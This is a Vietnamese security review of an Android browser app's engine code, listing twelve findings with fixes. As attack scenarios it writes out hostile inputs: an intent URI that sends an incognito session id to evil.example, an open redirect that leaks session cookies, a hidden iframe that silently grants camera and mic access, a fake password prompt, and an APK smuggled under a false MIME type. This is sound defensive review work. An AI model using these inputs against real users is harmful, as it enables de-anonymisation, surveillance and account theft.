# Phase 4 (Browser engine): review bảo mật và độ bền

Ngày 2026-10-22 00:33 (Asia/Singapore). Reviewer độc lập, chỉ đọc. Nhánh `feat/skim-design-implementation`, mã phase 4 chưa commit.

## Kết quả

- **12 phát hiện: 0 Critical, 0 High, 8 Medium, 4 Low.**
- **Không có phát hiện nào chặn commit theo nghĩa lộ dữ liệu ngay hay chạy mã.** Các bảo đảm cốt lõi đều đúng: không nội suy chuỗi vào JS, tải từ incognito không bao giờ qua DownloadManager hay cookie mặc định, không ghi Room/history/state/thumbnail cho incognito, tên tệp không thoát khỏi Downloads, `TabStateStore` chịu được file hỏng.
- **Nên sửa trước commit (rẻ, trang web kích hoạt được bằng một chạm):** M1 (hai MainActivity chồng nhau làm TabManager mất engine và dừng timer JS toàn cục) và M2 (intent ra ngoài giữ cờ launch, nhắm được vào chính Skim, không biết incognito).
- **M6 phải sửa trước khi phase 7 nối "Download link/image". M3 và M8 phải sửa trước khi phase 7 dựng dialog.**

Phạm vi đã đọc toàn bộ: `browser/**` (trừ `downloads/BlobBridge.kt`), `assets/js/skim-extract.js`, `skim-highlight.js`, `skim-readerable.js`, `MainActivity.kt`, `AppContainer.kt`, `AppStorage.kt`, `SkimApplication.kt`, `AndroidManifest.xml`, `res/xml/{network_security_config,file_paths,backup_rules,data_extraction_rules}.xml` (khoảng 6.900 dòng). Test chỉ đọc để đối chiếu ý định (`ExternalIntentsTest`, `DownloadRouterTest`, `MimeSnifferTest`, `SitePermissionBridgeTest`). Không chạy Gradle, không dùng thiết bị. Một số kết luận dựa vào hành vi nền tảng (Android, WebView, DownloadManager), được ghi rõ ở từng mục. Không mở lại quyết định nào trong danh sách "Đã chốt".

## Bảng phát hiện

| # | Mức | Vị trí | Tóm tắt |
|---|---|---|---|
| M1 | Medium | `MainActivity.kt:70,100,114,117`; `TabManager.kt:568-572`; `WebViewPool.kt:192-200,568` | Khi một MainActivity mới được tạo trước khi instance cũ dừng, instance cũ gọi `pauseTimers()` toàn cục và `detach()` engine của instance mới |
| M2 | Medium | `ExternalIntents.kt:35-53`; `SkimWebViewClient.kt:28-36,68-80`; `WebViewPool.kt:453` | Intent ra ngoài không biết tab có incognito không, giữ mọi cờ launch, không loại gói của chính Skim |
| M3 | Medium | `SitePermissionBridge.kt:165-184,218-253,259-264` | Quyết định quyền khoá theo host của frame yêu cầu; tự cấp cả khi frame bị trang khác nhúng, kể cả ở tab nền |
| M4 | Medium | `DownloadRouter.kt:111-115,212-219`; `SkimWebView.kt:74-75`; `TabManager.kt:788` | Giới hạn tải tự động bị lách: trang tự tải lại được hạn mức mới; mọi chạm, kể cả cuộn, mở 5 s không giới hạn |
| M5 | Medium | `InProcessDownloader.kt:95-110`; `DownloadRouter.kt:143-160,182-194`; `MediaStoreDownloads.kt:58-64` | Tải trong process (incognito) không có trần kích thước, không deadline, không cách hủy |
| M6 | Medium (tiềm ẩn) | `DownloadRouter.kt:125-140`; `DownloadTracker.kt:77-83`; `network_security_config.xml:8` | Header `Cookie` tính cho URL đầu được DownloadManager gửi lại ở mọi chặng redirect, sang host khác và sang `http:` |
| M7 | Medium | `SkimWebView.kt:30`; `WebViewPool.kt:395-410` | WebView incognito không đặt `IME_FLAG_NO_PERSONALIZED_LEARNING`, nên bàn phím học và lưu chữ gõ trong incognito |
| M8 | Medium | `SkimChromeClient.kt:28-162`; `WebViewPool.kt:312-328,388-392` | alert/confirm/prompt để mặc định WebView: tab nền hoặc offscreen bật dialog đè tab hiện tại; vòng `alert()` khoá app |
| L1 | Low | `MimeSniffer.kt:44-62,128`; `DownloadNames.kt:43-51` | Byte ZIP kèm MIME giả `application/vnd.oasis.opendocument.*` và tên `.apk` vẫn được lưu thành `.apk` |
| L2 | Low | `SkimChromeClient.kt` (không override `onConsoleMessage`) | Console message và URL script của trang incognito bị ghi vào logcat |
| L3 | Low | `ThumbnailStore.kt:47,61-75` | Bitmap thumbnail của tab thường nằm trong RAM suốt process, tăng theo số tab |
| L4 | Low | `TabManager.kt:523-551,774-781`; `WebViewPool.kt:330-339` | `evaluate` không có timeout: trang treo JS làm `extractPage`/`highlightBlock` chờ vô hạn |

## Chi tiết từng phát hiện

### M1 (Medium): hai MainActivity chồng nhau làm hỏng engine của Activity mới

**Bằng chứng.** `onCreate` gắn pool mới bằng `attach` (`MainActivity.kt:70`). `onStop` của instance cũ gọi `pool.onStop()` (`:100`), hàm này gọi `pauseTimers()` (`WebViewPool.kt:198`). Đây là lệnh toàn cục cho mọi WebView của process. Pool mới đã qua `onStart` với `timersPaused = false` nên không bao giờ resume. `onDestroy` của instance cũ gọi `tabs.detach()` (`MainActivity.kt:117`). Hàm này đặt `engine.value = null` mà không so danh tính (`TabManager.kt:569`) và đặt `pageLoaded = false` cho mọi tab (`:571`). `destroyAll()` của pool cũ còn phát `onWebViewDestroyed` cho các tab đang sống trong pool mới (`WebViewPool.kt:568`).

**Kịch bản.** Thứ tự chuẩn của Android khi một instance đang kết thúc bị instance mới thay chỗ là: cũ `onPause`, mới `onCreate`/`onStart`/`onResume`, rồi cũ `onStop`, cũ `onDestroy` (hành vi nền tảng). Tình huống này xảy ra khi task bị xoá bằng một intent có `FLAG_ACTIVITY_NEW_TASK|FLAG_ACTIVITY_CLEAR_TASK`. Intent đó có thể đến từ một app khác mở link, hoặc từ chính trang web qua M2: `intent://x#Intent;scheme=https;package=com.dantech.skimbrowser;launchFlags=0x10008000;end` sau một chạm. Nó cũng xảy ra khi người dùng thoát app rồi mở lại ngay (trên API < 31, Back kết thúc root activity).

**Hậu quả.** Trong Activity mới, timer, layout và parsing JS của mọi trang đứng yên. `load()` chỉ xếp lệnh vào `pendingLoads` (`TabManager.kt:243-248`), nên gõ URL không tải gì. Back, reload và find không có tác dụng. `awaitPageReady` chờ engine tới khi hết timeout, nên Reader và AI hỏng. Tình trạng kéo dài tới khi Activity được tạo lại. Undo cũng mất vì `finalizePendingCloses()` chạy ở `:114`.

**Đề xuất.** Đổi thành `TabManager.detach(engine)`, chỉ tách khi `this.engine.value === engine`; `MainActivity` truyền `browserHost.pool`. `WebViewPool.onStop` chỉ gọi `pauseTimers()` khi chính pool đó là engine đang gắn, hoặc đếm số pool đang started ở mức process. Pool đã bị thay thì không phát `onWebViewDestroyed` và không reset runtime. Sửa thêm M2 (lọc cờ launch).

### M2 (Medium): intent ra ngoài không biết incognito, giữ cờ launch, nhắm được vào chính Skim

**Bằng chứng.** `SkimWebViewClient` không nhận cờ incognito (`WebViewPool.kt:453`), và `externalNavigation(uri, hasGesture)` không có tham số đó. Với `intent:`, mã chỉ xoá component, selector và cờ grant (`ExternalIntents.kt:45-48`). Mã giữ nguyên `package=` và mọi cờ launch khác; `ExternalIntentsTest` dòng 62-70 khẳng định `FLAG_ACTIVITY_NEW_TASK` được giữ. Mã cũng không loại gói của chính Skim.

**Kịch bản A (riêng tư).** Trang trong tab incognito biến mọi link thành `intent://evil.example/t?id=<mã phiên>#Intent;scheme=https;package=com.android.chrome;end`, hoặc bỏ `package` để vào trình duyệt mặc định. Người dùng chạm một lần là URL mở trong profile thường của Chrome, kèm cookie bền, và kẻ tấn công nối được danh tính incognito với danh tính thật. Skim không cảnh báo "rời incognito" như Chrome. Khi phase 5 xử lý intent VIEW bằng cách mở tab thường, `package=com.dantech.skimbrowser` sẽ đưa URL vào tab thường của chính Skim (Room và history). `tel:`, `sms:`, `mailto:` từ incognito cũng mở thẳng app khác.

**Kịch bản B (độ bền).** `launchFlags=0x10008000` (NEW_TASK|CLEAR_TASK) nhắm vào Skim làm Skim tự xoá task của chính nó, kích hoạt M1 và làm mất Undo.

**Đề xuất.**
- Truyền `incognito` vào `SkimWebViewClient` và `externalNavigation`. Ở tab incognito, trả `Blocked`, hoặc `Launch` kèm xác nhận "rời incognito" ở phase 7.
- Với intent có `data` là http/https mà không chỉ định gói, hoặc chỉ định gói Skim: tải `data` ngay trong tab qua `loadInTab` thay vì launch.
- Lọc cờ theo allowlist như Chrome, ví dụ `intent.flags = intent.flags and Intent.FLAG_ACTIVITY_NEW_TASK`.

### M3 (Medium): quyền đã nhớ áp cho frame bị nhúng trong trang khác

**Bằng chứng.** `requestMedia` lấy host từ `PermissionRequest.getOrigin()`, còn `requestLocation` lấy từ `origin` mà WebView đưa (`SitePermissionBridge.kt:165-184`). Với iframe, WebView báo origin của frame đang yêu cầu, không phải trang top-level (hành vi WebView). `submit()` tra quyết định theo host đó (`:218-240`). `decide()` chuyển request có ALLOWED sang `GRANTING` (`:246`), và `advance()` cấp mọi request `GRANTING` của bất kỳ tab nào khi Android đã có quyền runtime (`:261-264`). Không có bước nào so host này với host top-level của tab.

**Kịch bản.** Người dùng từng chọn "Allow" kèm remember cho camera/mic của một site họp video cho phép nhúng iframe và tự vào phòng theo URL (gọi là `meet.example`). Trang `evil.example`, hoặc quảng cáo trên đó, đặt `<iframe src="https://meet.example/AttackerRoom" allow="camera;microphone" style="opacity:0">`. WebView gọi `onPermissionRequest` với origin `meet.example`. Skim cấp ngay, không có dialog, kể cả khi tab ở nền hay offscreen, và camera cùng mic phát vào phòng của kẻ tấn công. Khi chưa có quyết định nào, dialog chỉ hiện `meet.example` vì bridge không biết trang nhúng, nên người dùng tưởng mình đang cấp quyền cho site tin cậy.

**Đề xuất.** Trong `submit()`, lấy `top = hostOf(tabs.value.tab(tabId)?.url.orEmpty())`. Nếu `host != top` thì deny, hoặc khoá quyết định theo `top` như mô hình permission delegation của Chrome. Không bao giờ áp hay lưu quyết định đã nhớ cho frame khác site. Nên cân nhắc chỉ tự cấp cho tab đang hiển thị. Hiện chưa có test cho trường hợp này.

### M4 (Medium): giới hạn tải tự động bị lách

**Bằng chứng.** `allowAutomatic` khoá theo `loadNonce` hiện tại (`DownloadRouter.kt:212-217`). Nonce đổi ở mỗi `onPageStarted`, kể cả điều hướng do trang tự gây (`TabManager.kt:788`). `hadGesture` trả true cho mọi `ACTION_DOWN` trong 5 s (`SkimWebView.kt:74-75`), kể cả lúc bắt đầu cuộn, và không bị tiêu thụ sau khi dùng. Mã làm đúng chữ của plan ("1 lần mỗi lần tải trang"), nhưng chính quy tắc đó bị lách được.

**Kịch bản 1.** Trang tải xong, kích hoạt một download (được phép với nonce N), rồi gọi `location.reload()`. Nonce lên N+1, trang tải tiếp một file, và vòng lặp tiếp diễn. Không cần chạm nào mà số download không giới hạn. Ở tab thường, file đổ vào DownloadManager (thông báo, file trong Downloads công khai); ở incognito, mỗi download chạy như M5.

**Kịch bản 2.** Người dùng cuộn trang một lần. Trong 5 s sau đó, trang gọi `a.click()` hàng trăm lần trên link `data:` hoặc `blob:`. Mỗi download loại này giữ tới 25 MB trong RAM (`DownloadRouter.kt:162-179`) và không có giới hạn số chạy đồng thời. Chrome chặn đúng mẫu này: điều hướng do renderer khởi tạo không reset bộ giới hạn tải.

**Đề xuất.**
- Giữ hạn mức tự động theo tab qua các điều hướng do renderer gây. Chỉ reset khi điều hướng do người dùng (`TabManager.load`, hoặc chạm link ngay trước đó), hoặc dùng token bucket theo tab (ví dụ 1 lần mỗi 30 s).
- Chỉ tính chạm kiểu tap (ACTION_UP không kéo) và tiêu thụ cử chỉ sau một download.
- Giới hạn số download `data:`/`blob:` chạy đồng thời.

### M5 (Medium): tải trong process không trần, không deadline, không hủy được

**Bằng chứng.** `InProcessDownloader.save` chép tới EOF và chỉ kiểm `ensureActive()` (`InProcessDownloader.kt:101-109`). Client kế thừa connect/read timeout 15 s, không có `callTimeout` (`AppContainer.kt:78-83`). Download chạy trong `appScope` (`DownloadRouter.kt:182-194`), không giữ `Job`, không có thông báo, không có đường hủy. `MediaStoreDownloads.save` không kiểm dung lượng trống (`:58-64`).

**Kịch bản.** Trang trong tab incognito, không cần chạm (dùng lượt tự động đầu tiên), điều hướng tới `https://evil.example/stream`. Server trả `Content-Disposition: attachment` kèm luồng byte vô hạn, hoặc một gzip bomb mà OkHttp tự giải nén. Skim ghi vào file pending trong Downloads cho tới khi hết chỗ (ENOSPC), và việc ghi vẫn tiếp tục sau khi đóng tab hay rời app. Người dùng không thấy gì và không hủy được. Trong lúc đó bộ nhớ máy đầy: hệ thống có thể dọn cache của mọi app, và app khác lỗi khi ghi. Cuối cùng IOException làm file bị xoá. Nếu server gửi 1 byte mỗi 14 s, kết nối được giữ vô thời hạn.

**Đề xuất.** Đặt trần kích thước: từ chối khi `Content-Length` vượt trần, dừng khi số byte đã đếm vượt trần. Kiểm `StorageManager.getAllocatableBytes`/`StatFs` và chừa một phần dự trữ. Thêm deadline tổng hoặc ngưỡng thông lượng tối thiểu. Giữ `Job` cho từng download để `DownloadTracker` hoặc UI hủy được.

### M6 (Medium, tiềm ẩn): DownloadManager gửi lại cookie qua redirect

**Bằng chứng.** `startSystem` lấy cookie của profile mặc định một lần, cho URL đầu (`DownloadRouter.kt:127-132`). `AndroidSystemDownloads.enqueue` gắn cookie đó bằng `addRequestHeader` (`DownloadTracker.kt:83`). DownloadManager (lớp `DownloadThread` của AOSP) thêm lại mọi request header ở mỗi chặng redirect. Nó theo redirect sang host khác, và sang `http:` khi app cho phép cleartext (`network_security_config.xml:8`). `CookieManager.getCookie` trả cả cookie HttpOnly, Secure và SameSite=Strict.

**Kịch bản.** Phase 7 nối "Download link/image" qua `start(..., userInitiated = true)`. Trang đặt `<img src="https://victim.example/out?to=https://evil.example/cat.jpg">`, tức một open redirect bất kỳ. Người dùng nhấn giữ ảnh và chọn Download image. Skim đưa cookie phiên của `victim.example` cho DownloadManager. Server trả 302, DownloadManager gửi cùng header `Cookie` tới `evil.example`, và kẻ tấn công chiếm được phiên.

Hiện tại, đường tải do trang khởi tạo khó khai thác hơn: WebView đưa cho `DownloadListener` URL cuối cùng sau redirect (cần xác nhận trên thiết bị). Vì vậy kẻ tấn công cần server đầu tiên redirect khác đi ở lần tải thứ hai.

**Đề xuất (vẫn giữ DownloadManager như đã chốt).** Không gắn `Cookie` cho download `userInitiated`. Hoặc giải redirect trước trong process (OkHttp với `followRedirects(false)`, cookie mặc định theo từng chặng như `InProcessDownloader`) rồi giao URL cuối cho DownloadManager. Không gắn cookie khi URL là `http:`.

### M7 (Medium): bàn phím học chữ gõ trong incognito

**Bằng chứng.** `SkimWebView` không override `onCreateInputConnection`, và không chỗ nào đặt `EditorInfo.IME_FLAG_NO_PERSONALIZED_LEARNING`. Chromium chỉ tự đặt cờ này khi `WebContents.isIncognito()`. Profile WebView không phải off-the-record (plan đã ghi nhận điều này), nên WebView không đặt cờ.

**Kịch bản.** Người dùng gõ tên, email hoặc truy vấn tìm kiếm vào form của một trang trong tab incognito. Gboard, hoặc IME khác, học các từ đó và lưu vào từ điển cá nhân, có thể đồng bộ lên tài khoản. Chữ gõ trong incognito sau đó hiện thành gợi ý ở các app khác. Đây là dữ liệu bị lưu ra đĩa ngoài thư mục dự định (câu hỏi 1).

**Đề xuất.** Cho `SkimWebView` nhận cờ incognito (`WebViewPool.create` đã biết `tab.incognito`). Override `onCreateInputConnection`: gọi `super` trước, rồi OR thêm `IME_FLAG_NO_PERSONALIZED_LEARNING` vào `imeOptions`. Ô địa chỉ ở phase 5/6 cũng cần cờ này.

### M8 (Medium): dialog JS mặc định từ tab nền và vòng alert

**Bằng chứng.** `SkimChromeClient` không override `onJsAlert`, `onJsConfirm`, `onJsPrompt`, `onJsBeforeUnload`. Researcher có ghi "giữ mặc định", nhưng mục này không nằm trong danh sách đã chốt. Dialog mặc định (`JsDialogHelper` của nền tảng) hiện trên Activity bất kể WebView có đang hiển thị không, và không có tuỳ chọn chặn các dialog tiếp theo. WebView nền chỉ bị `onPause()` (`WebViewPool.kt:391`), mà `onPause()` không dừng JS; WebView offscreen của `awaitPageReady` (`:312-328`) cũng chạy JS bình thường.

**Kịch bản 1.** Người dùng mở `evil.example` rồi chuyển sang tab ngân hàng. Tab evil vẫn sống trong pool và gọi `prompt("Phiên hết hạn, nhập lại mật khẩu")`. Dialog đè lên tab ngân hàng, và chữ người dùng nhập được trả về cho trang evil. Tiêu đề dialog chỉ ghi "The page at https://evil.example says".

**Kịch bản 2.** `onload = () => { for (;;) alert(1) }`. Bấm Back hay chạm ra ngoài chỉ hủy được một dialog, dialog mới hiện ngay sau đó. Người dùng không tới được UI để đóng tab và phải force-stop app. Ở lần mở sau, tab hiện tại được khôi phục và vòng lặp chạy lại.

**Đề xuất.** Override bốn callback trên. Nếu tab không phải tab hiện tại, hoặc WebView không nằm trong host đang hiển thị, thì gọi `result.cancel()` và trả `true`. Với tab hiện tại, đếm dialog theo `loadNonce` và tự hủy sau N lần trong T giây, hoặc dùng dialog của Skim có lựa chọn "chặn dialog từ trang này".

### L1 (Low): `.apk` lọt qua sniffer nhờ MIME Office/ODF giả

**Bằng chứng.** `refines(ZIP, specific)` chấp nhận mọi type bắt đầu bằng `application/vnd.openxmlformats-officedocument.` hoặc `application/vnd.oasis.opendocument.` (`MimeSniffer.kt:57-62,128`). Với type mà `MimeTypeMap` không biết, `DownloadNames.extensionFor` giữ nguyên đuôi do trang đặt (`DownloadNames.kt:48`).

**Kịch bản.** Trong tab incognito, server trả byte APK (một file ZIP) với `Content-Type: application/vnd.oasis.opendocument.x` và `filename="update.apk"`. Ở bất kỳ tab nào, trang cũng có thể dùng `data:application/vnd.oasis.opendocument.x;base64,UEsDB...` với `download="update.apk"`. `downloadMimeOf` trả type giả, `sanitize` giữ đuôi `.apk`, và MediaStore lưu file `update.apk`. Kết quả này trái với quy tắc ghi ngay trong mã: "a ZIP archive declared or named as an APK is saved as a ZIP". Tác động hạn chế: Skim không khai báo `REQUEST_INSTALL_PACKAGES`, và đường DownloadManager của tab thường vốn đã cho phép `.apk` theo thiết kế; người dùng vẫn có thể cài file từ app Files.

**Đề xuất.** `refines` chỉ nhận type mà `MimeTypeMap` biết (`getExtensionFromMimeType(specific) != null`). Trong `extensionFor`, khi `expected == null`, chỉ giữ `own` nếu `getMimeTypeFromExtension(own)` là null hoặc bằng `type`.

### L2 (Low): console của trang incognito vào logcat

**Bằng chứng.** Không có override `onConsoleMessage`, nên hàm mặc định trả false. Khi đó content ghi message vào logcat dạng `I/chromium: [INFO:CONSOLE(n)] "...", source: <URL>`. Chromium chỉ bỏ ghi khi browser context là off-the-record (comment trong mã Chromium: "LogMessages can be persisted"), mà profile WebView thì không phải off-the-record.

**Kịch bản.** Mọi trang incognito có `console.log` hoặc lỗi JS đều để lại URL script và nội dung message trong log hệ thống. Log này đọc được qua adb và bugreport, và một số máy lưu log ra đĩa.

**Đề xuất.** Override `onConsoleMessage(consoleMessage: ConsoleMessage) = true` cho tab incognito, tốt nhất cho mọi tab ở bản release.

### L3 (Low): thumbnail tab thường không bao giờ rời RAM

**Bằng chứng.** `put()` gán bitmap vào `entry.flow` và giữ nó tới khi tab bị xoá (`ThumbnailStore.kt:61-75`). Chỉ incognito có LRU 16 MB. Mỗi bitmap là ARGB với cạnh bằng 0,35 lần chiều rộng view: khoảng 306 KB ở màn 1080 px, khoảng 1,7 MB ở tablet 2560 px.

**Kịch bản.** Một phiên mở và duyệt 300 tab thường giữ khoảng 90 MB bộ nhớ native trên điện thoại, và vài trăm MB trên tablet, không bao giờ giải phóng. LMK giết Skim sớm khi ở nền, và máy RAM thấp có thể bị OOM.

**Đề xuất.** Dùng LRU theo byte cho cả tab thường. Ảnh đã có trên đĩa, nên `observe` đọc lại khi ảnh bị đẩy ra khỏi bộ nhớ.

### L4 (Low): `evaluate` không có timeout

**Bằng chứng.** `WebViewPool.evaluate` chờ callback của `evaluateJavascript` không giới hạn và không có `invokeOnCancellation` (`:330-339`). `extractPage` và `highlightBlock` không bọc timeout; chỉ `awaitPageReady` có.

**Kịch bản.** Sau khi tải xong, trang chạy `while(true){}` hoặc vòng `alert()` (M8). Lệnh `extractPage` mà Reader hay AI gọi sẽ treo tới khi tab bị đóng hoặc bị evict.

**Đề xuất.** Bọc `withTimeoutOrNull` (ví dụ 10 s) trong `evaluateOrNull`. Thêm `invokeOnCancellation { entry.evaluations.remove(continuation) }` trong `evaluate`.

## Khu vực đã xem, sạch (kèm trả lời 8 câu hỏi)

Cả 8 câu hỏi đều đã được xem.

1. **Incognito.**
   - Tải xuống của tab incognito, kể cả popup từ `window.open`, tab khôi phục trong process và tab Undo, đi theo `tab.incognito` lấy từ `TabManager.state` (`DownloadRouter.kt:105,118`). Popup kế thừa cờ incognito (`TabManager.kt:904`) và dùng đúng profile của phiên (`WebViewPool.kt:397,413-420`). Tab đang chờ Undo không tải được (tab là null).
   - Không ghi Room, history hay `lastTabId`: `persistTab` có kiểm, `applyLayout` lọc incognito, `onVisitedHistory`/`onTitle` bỏ qua incognito. State và thumbnail incognito chỉ nằm trong bộ nhớ. Quyết định quyền chỉ ở `IncognitoSession`. OkHttp không có `Cache` hay `CookieJar`.
   - Vòng đời Active → Ending → None với Undo, mở tab mới lúc Ending và đóng lẫn tab thường/incognito đều đúng: token cũ bị finalize, tab không quay về phiên khác.
   - Dữ liệu còn sót sau `end()` hoặc khi process chết: thư mục profile còn trên đĩa tới lần khởi động sau (`purgeStale`). Service worker và Cache Storage còn lại khi không có `DELETE_BROWSING_DATA`. Cache HTTP còn lại khi không có Activity. Tất cả khớp thiết kế đã chốt, nên không tính là phát hiện.
   - Lỗ rò tìm thấy: M7 (bàn phím), L2 (logcat), M2 (chuyển sang trình duyệt thường).
2. **ExternalIntents.**
   - Không có cử chỉ thì không launch. Frame con không launch được, vì `return false` khiến WebView báo `ERR_UNKNOWN_URL_SCHEME`.
   - Scheme được lowercase; Chromium đã chuẩn hoá URL (bỏ khoảng trắng đầu; scheme viết dạng %-escape thành URL tương đối).
   - Mã thêm BROWSABLE, xoá component, selector và cờ grant (nền tảng cũng xoá cờ grant). Chặn `data` là `file:`/`content:`/`javascript:`. Fallback chỉ http(s) có host. `parseUri` lỗi thì trả Blocked.
   - Extra `EXTRA_STREAM` không thể là Uri khi đi qua `parseUri`, nên không có cấp quyền ngầm.
   - Vấn đề tìm thấy: M2.
3. **evaluateJavascript.**
   - Ngoài `BlobBridge`, chỉ có 3 chỗ chạy script. Riêng highlight nhận tham số, và tham số đi qua `Json.encodeToString` cộng `escapeForScript`; `blockId` khớp `^\d{1,9}$`.
   - Script highlight tự kiểm lại `location.href` trong trang. Extract so nonce và URL trước và sau khi chạy. Readerable trả `=== true`. Readability chạy trong function scope có `var module`.
   - Không tìm được đường nào để chuỗi do trang kiểm soát thoát khỏi chuỗi JSON. Ô nhiễm môi trường main world chỉ làm hỏng dữ liệu trả về (đã chấp nhận); trang có thể phình kích thước kết quả, xem câu hỏi mở 1.
4. **Tải xuống.**
   - `sanitize` chỉ lấy basename (đổi `\` thành `/`), bỏ ký tự điều khiển, bidi, zero-width và tag, thay ký tự bị cấm bằng `_`, cắt dấu chấm đầu/cuối, giới hạn 200 byte và giữ nguyên đuôi. Đuôi kép `.pdf.apk` theo MIME, nên vẫn hiện đúng `.apk`. Tên dành riêng của Windows không liên quan trên hệ file Android.
   - MediaStore bản scoped dùng `IS_PENDING` và xoá file khi lỗi hay bị hủy. Bản legacy dùng `createNewFile` nguyên tử, chặn `/`, `.` và `..`.
   - `data:` có trần 25 MB sau khi giải mã. Redirect trong process dùng cookie theo từng chặng và không cookie khi chuyển https sang http. SSRF không khác WebView, vì download tải lại đúng URL mà WebView vừa đi tới.
   - Vấn đề tìm thấy: M4, M5, M6, L1.
5. **SitePermissionBridge.**
   - Khoá theo host: gộp `www.`, cổng và scheme là chủ đích; userinfo bị bỏ; subdomain được tách riêng.
   - Mỗi callback được trả lời đúng một lần (`settle` và `done`). Rút lại (withdraw), đóng tab và hủy Activity đều deny hoặc bỏ đúng request.
   - Request incognito không bao giờ ghi vào repository. ALLOWED chỉ được lưu sau khi Android cấp quyền runtime. Location chỉ cho https, và origin `null` hay `http:` bị deny.
   - Vấn đề tìm thấy: M3, cùng câu hỏi mở 5.
6. **Vòng đời và rò rỉ.**
   - Coroutine trong `appScope` thả tham chiếu Activity khi Activity bị hủy: `destroyAll` trả null cho các `evaluate` đang chờ, và prompt quyền đang chờ bị deny. Receiver đăng ký và gỡ ở `onStart`/`onStop`; back callback gắn với lifecycle.
   - Renderer chết thì `destroy` trả null cho các `evaluate` đang chờ.
   - `persistTab` đọc lại state lúc ghi, nên tab đã đóng không bao giờ bị ghi lại. Ghi state và thumbnail có thứ tự nhờ `SerialWriter` (mutex công bằng).
   - Vấn đề tìm thấy: M1, L4.
7. **Cấu hình WebView và manifest.**
   - Tắt file access và content access. Mixed content mặc định "never". Safe Browsing mặc định bật. Không có `addJavascriptInterface`. Popup cần cử chỉ và dùng cùng profile với opener.
   - `onShowFileChooser` dùng `createIntent()` và trả lời đúng một lần. Fullscreen báo `onCustomViewHidden` đúng một lần. `onRenderProcessGone` có ngân sách 2 lần mỗi 60 s.
   - Manifest: FileProvider không exported và chỉ chia sẻ `cache/shared/`. Backup và device transfer bị tắt. Cleartext được phép (cần cho trình duyệt) và chỉ tin CA hệ thống. Không có `REQUEST_INSTALL_PACKAGES`.
   - Vấn đề tìm thấy: M8, L2.
8. **Độ bền và DoS.**
   - URL lưu Room tối đa 8.192 ký tự; history có giới hạn riêng; title tối đa 1.024 ký tự.
   - Khi trang gọi `pushState` dồn dập: Blink tự giới hạn khoảng 200 lần mỗi 10 s, và việc ghi tab được gộp theo tab.
   - `TabStateStore` có magic, version, CRC và trần 2 MB; `tabId` khớp `[A-Za-z0-9_-]{1,64}` nên không có path traversal.
   - `purgeStale`, `purgeExcept` và `deleteRecursively` chỉ chạm thư mục của app.
   - Vấn đề tìm thấy: L3.

## Câu hỏi chưa giải quyết

1. WebView đưa `data:` URL dài tối đa bao nhiêu cho `DownloadListener`? `parseDataUrl` nhận body tới khoảng 75 triệu ký tự, và `percentDecode` cấp phát khoảng 2 lần body trước khi từ chối. Nếu WebView cho qua `data:` URL lớn hơn 2 MB, bộ nhớ đỉnh có thể lên hàng trăm MB. Nên siết trần cho base64 xuống khoảng 4/3 × 25 MB và kiểm trên thiết bị.
2. Với M6, cần xác nhận trên thiết bị rằng URL đưa cho `DownloadListener` luôn là URL sau redirect.
3. Tab incognito có nên đặt `importantForAutofill = NO_EXCLUDE_DESCENDANTS` để dịch vụ Autofill không lưu mật khẩu gõ trong incognito không? Đây là quyết định sản phẩm.
4. Tải trong process của incognito dùng chung `ConnectionPool` với OkHttp của chế độ thường ở phase 6/7. Kết nối dùng lại có thể nối hoạt động incognito với hoạt động thường trên cùng một host. Nên dùng pool riêng cho mỗi phiên incognito và evict nó ở `end()`.
5. API dialog quyền ở phase 7: `allow`, `block` và `dismiss` tác động lên request đang `shown` tại lúc gọi. Nên truyền vào `PendingSitePermission` mà UI đã hiển thị và bỏ qua nếu không khớp, để chặn kiểu tấn công đổi request ngay dưới ngón tay người dùng.
6. Fullscreen (`onShowCustomView`) không có gợi ý cách thoát, nên trang có thể vẽ thanh địa chỉ giả. Phase 7 có thiết kế cho phần này không?
7. `onTitle` chỉ trim và cắt độ dài, nên ký tự bidi và ký tự điều khiển vẫn vào `Tab.title` và Room. UI ở phase 5/9 phải hiển thị an toàn, hoặc gọi `toVisibleText()` ngay tại đây.
